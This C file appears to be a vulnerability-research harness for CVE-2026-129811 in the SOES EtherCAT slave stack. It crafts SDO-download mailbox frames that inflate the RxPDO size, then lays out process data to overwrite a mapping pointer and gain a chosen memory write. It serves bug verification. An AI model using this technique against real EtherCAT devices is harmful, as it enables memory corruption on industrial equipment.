/* SOES 3.2.0 CVE-2026-129811 — CoE mailbox path to the PDO write.
 *
 * Advances the frontier harness by one real-consumer step: the RxPDO mapping
 * values that sizeOfPDO() consumes are installed by crafted SDO-download
 * mailboxes parsed by the REAL ESC_coeprocess() / SDO_download() /
 * SDO_download_complete_access(), not by direct array assignment. The real
 * sizeOfPDO() and RXPDO_update()/COE_pdoUnpack() then run on the result.
 *
 * MBX[] is filled by this harness: no wire input, no HAL, no live slave.
 * This is rung-4 mechanics in real pinned functions, NOT wire evidence/R5.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

/* Real globals (MBX, MBXcontrol, ESCvar, SMmap2, rxpdo) and the real
 * ESC_download_pre/post_objecthandler from the pinned ecat_slv.c. */
#include "ecat_slv.c"

/* ---- Master-writable OD data buffers ----------------------------------
 * Stands for a device whose 1C12/1C1x entries have RAM data (many real
 * SOES devices allow runtime PDO assignment). The stock lan9252demo OD
 * makes 1C12 ATYPE_RO with data==NULL; that is an explicit negative below. */
static uint16_t g_si;            /* 1C12:00 number of mapped PDUs */
static uint16_t g_map1, g_map2;  /* 1C12:01/02 mapped object indexes */
static uint8_t  g_ms0, g_ms1;    /* 2000:00 / 2001:00 max subindex */
static uint32_t g_val0, g_val1;  /* 2000:01 / 2001:01 mapping values */

static const char n_si[] = "si", n_map[] = "map", n_ms[] = "maxsub",
                 n_val[] = "mapping-value", n_unpack[] = "unpack-target";

static const _objd od_1c12[] = {
   { 0, DTYPE_UNSIGNED8,  8, ATYPE_RWpre, n_si,  0, &g_si   },
   { 1, DTYPE_UNSIGNED16, 16, ATYPE_RWpre, n_map, 0, &g_map1 },
   { 2, DTYPE_UNSIGNED16, 16, ATYPE_RWpre, n_map, 0, &g_map2 },
};
static const _objd od_2000[] = {
   { 0, DTYPE_UNSIGNED8,  8, ATYPE_RWpre, n_ms,  0, &g_ms0  },
   { 1, DTYPE_UNSIGNED32, 32, ATYPE_RWpre, n_val, 0, &g_val0 },
};
static const _objd od_2001[] = {
   { 0, DTYPE_UNSIGNED8,  8, ATYPE_RWpre, n_ms,  0, &g_ms1  },
   { 1, DTYPE_UNSIGNED32, 32, ATYPE_RWpre, n_val, 0, &g_val1 },
};
static uint8_t g_unpack_target[32];
static uint8_t g_legit_target[32];
static const _objd od_7000[] = {
   { 0, DTYPE_UNSIGNED8,  8, ATYPE_RO, n_ms, 1, NULL },
   { 1, DTYPE_UNSIGNED32, 128, ATYPE_RO, n_unpack, 0, g_legit_target },
};
const _objectlist SDOobjects[] = {
   { 0x1c12, OTYPE_ARRAY,  2, 0, n_si,  od_1c12 },
   { 0x2000, OTYPE_RECORD, 1, 0, n_val, od_2000 },
   { 0x2001, OTYPE_RECORD, 1, 0, n_val, od_2001 },
   { 0x7000, OTYPE_RECORD, 1, 0, n_unpack, od_7000 },
   { 0xFFFF, 0, 0, 0, NULL, NULL },
};

/* Stubs for ecat_slv.c externs unused on this path. */
void ESC_write(uint16_t a, void *b, uint16_t l) { (void)a;(void)b;(void)l; }
void FOE_init(void) {}
void EOE_init(void) {}
void MBX_error(uint16_t err) { (void)err; }

/* No spare mailbox: responses are suppressed, request buffer is reused by
 * set_state_idle(). The OD writes happen before this call in the real code. */
uint8_t ESC_claimbuffer(void) { return 0; }

static uint8_t g_process[128];
static _objd g_fake_obj;

void ESC_read(uint16_t address, void *buf, uint16_t len)
{
   (void)address;
   if (len > sizeof(g_process)) len = sizeof(g_process);
   memcpy(buf, g_process, len);
}

/* Deliver one already-built mailbox frame through the real CoE dispatcher. */
static void deliver(void)
{
   _COEsdo *s = (_COEsdo *)&MBX[0];
   printf("deliver: idx=%04x sub=%u cmd=%02x len=%u type=%u run=%u al=%02x\n",
          (unsigned)etohs(s->index), s->subindex, s->command,
          (unsigned)etohs(s->mbxheader.length), s->mbxheader.mbxtype,
          ESCvar.MBXrun, ESCvar.ALstatus);
   MBXcontrol[0].state = MBXstate_inclaim;
   ESCvar.xoe = 0;
   ESC_coeprocess();
   printf("  -> xoe=%02x ms0=%u ms1=%u\n", ESCvar.xoe, g_ms0, g_ms1);
}

/* Build an expedited SDO-download request in MBX[0]. */
static void build_download(uint16_t index, uint8_t subindex,
                           uint8_t command, uint32_t data)
{
   memset(MBX, 0, sizeof(MBX));
   _COEsdo *s = (_COEsdo *)&MBX[0];
   s->mbxheader.length = htoes(COE_HEADERSIZE + 4);
   s->mbxheader.mbxtype = MBXCOE;
   s->coeheader.numberservice = htoes(COE_SDOREQUEST << 12);
   s->command = command;
   s->index = htoes(index);
   s->subindex = subindex;
   s->size = htoel(data);
}

/* Build a normal (non-expedited) SDO Download Complete Access in MBX[0],
 * payload = the raw bytes to copy into successive subindex data buffers. */
static void build_complete_access(uint16_t index, const uint8_t *payload,
                                  uint32_t nbytes)
{
   memset(MBX, 0, sizeof(MBX));
   _COEsdo *s = (_COEsdo *)&MBX[0];
   s->mbxheader.length = htoes(COE_HEADERSIZE + 4 + nbytes);
   s->mbxheader.mbxtype = MBXCOE;
   s->coeheader.numberservice = htoes(COE_SDOREQUEST << 12);
   s->command = COE_COMMAND_DOWNLOADREQUEST | COE_COMPLETEACCESS;
   s->index = htoes(index);
   s->subindex = 0;
   s->size = htoel(nbytes);
   memcpy((uint8_t *)(&s->size) + 4, payload, nbytes);
}

static void reset(void)
{
   memset(&g_si, 0, sizeof(g_si));
   g_map1 = g_map2 = 0;
   g_ms0 = g_ms1 = 0;
   g_val0 = g_val1 = 0;
   memset(g_process, 0x47, sizeof(g_process));
   memset(g_unpack_target, 0, sizeof(g_unpack_target));
   memset(&g_fake_obj, 0, sizeof(g_fake_obj));
   g_fake_obj.bitlength = 128;      /* >64 -> COE_pdoUnpack uses memcpy */
   g_fake_obj.data = g_unpack_target;
   memset(SMmap2, 0, sizeof(SMmap2));
   ESCvar.rxpdo_override = NULL;
   ESCvar.sm2mappings = 0;
   ESCvar.ESC_SM2_sml = 0;
   ESCvar.MBXrun = 1;
   ESCvar.ALstatus = ESCpreop;
   memset(MBXcontrol, 0, sizeof(MBXcontrol));
   ESCvar.xoe = 0;
}

int main(int argc, char **argv)
{
   int safe = (argc > 1 && strcmp(argv[1], "safe") == 0);
   int nmappings = 0;
   uint16_t size;

   reset();

   /* Frame 1: real Complete-Access SDO download writes 1C12:00/01(/02).
    * Sub0 is padded to 16 bits (OTYPE_ARRAY), so payload layout is
    * [count,pad, map1-lo,map1-hi, map2-lo,map2-hi]. */
   if (safe)
   {
      const uint8_t payload[] = { 1, 0, 0x00, 0x20 }; /* one 255-bit map */
      build_complete_access(0x1c12, payload, sizeof(payload));
   }
   else
   {
      const uint8_t payload[] = { 2, 0, 0x00, 0x20, 0x01, 0x20 };
      build_complete_access(0x1c12, payload, sizeof(payload));
   }
   deliver();
   printf("after 1C12 CA: si=%u map1=%04x map2=%04x\n",
          (unsigned)g_si, g_map1, g_map2);

   /* Frames 2-5: normal expedited downloads to 2000/2001 sub0 and sub1.
    * Each mapping value is (index<<16)|(subindex<<8)|bitlength(255). */
   build_download(0x2000, 0, 0x20 | 0x02 | 0x0C, 1);  /* expedited 1 byte */
   deliver();
   build_download(0x2000, 1, 0x20 | 0x02, 0x700001FFu);
   deliver();
   build_download(0x2001, 0, 0x20 | 0x02 | 0x0C, 1);  /* expedited 1 byte */
   deliver();
   build_download(0x2001, 1, 0x20 | 0x02, 0x700001FFu);
   deliver();
   printf("after 2000/2001: ms0=%u val0=%08x ms1=%u val1=%08x\n",
          (unsigned)g_ms0, (unsigned)g_val0,
          (unsigned)g_ms1, (unsigned)g_val1);

   /* The PREOP->SAFEOP assignment in esc.c:1209, unclamped in 3.2.0. */
#ifdef SOES_FIXED_VERSION
   size = sizeOfPDO(RX_PDO_OBJIDX, &nmappings, SMmap2, MAX_MAPPINGS_SM2,
                    MAX_RXPDO_SIZE);
#else
   size = sizeOfPDO(RX_PDO_OBJIDX, &nmappings, SMmap2, MAX_MAPPINGS_SM2);
#endif
   printf("mailbox -> sizeOfPDO=%u nmappings=%d MAX_RXPDO_SIZE=%d\n",
          (unsigned)size, nmappings, (int)MAX_RXPDO_SIZE);
   printf("SMmap2[0].obj after sizeOfPDO=%p (od_7000[1]=%p)\n",
          (void *)SMmap2[0].obj, (void *)&od_7000[1]);

   ESCvar.ESC_SM2_sml = size;
   ESCvar.sm2mappings = nmappings;
   if (size)
   {
      /* Pinned BSS: rxpdo[42] then 14 bytes pad, SMmap2[0].obj at +56.
       * A 64-byte ESC_read overwrites that pointer with these 8 bytes. */
      uintptr_t a = (uintptr_t)&g_fake_obj;
      int k;
      for (k = 0; k < 8; k++) g_process[56 + k] = (uint8_t)(a >> (8 * k));
      memset(g_process, 0x4d, 16);                    /* copied to target */
      RXPDO_update();
   }

   printf("diag: &g_fake_obj=%p fake.data=%p fake.bitlen=%u map0.offset=%u process0=%02x process56=%02x\n",
          (void *)&g_fake_obj, g_fake_obj.data, (unsigned)g_fake_obj.bitlength,
          (unsigned)SMmap2[0].offset, g_process[0], g_process[56]);
   printf("after RXPDO_update: SMmap2[0].obj=%p target0=%02x target_last=%02x\n",
          (void *)SMmap2[0].obj, g_unpack_target[0], g_unpack_target[15]);
   printf("verdict: mailbox_size_overflow=%d ptr_overwrite=%d chosen_write=%d\n",
          size > MAX_RXPDO_SIZE,
          SMmap2[0].obj == &g_fake_obj,
          g_unpack_target[0] == 0x4d && g_unpack_target[15] == 0x4d);
   return 0;
}
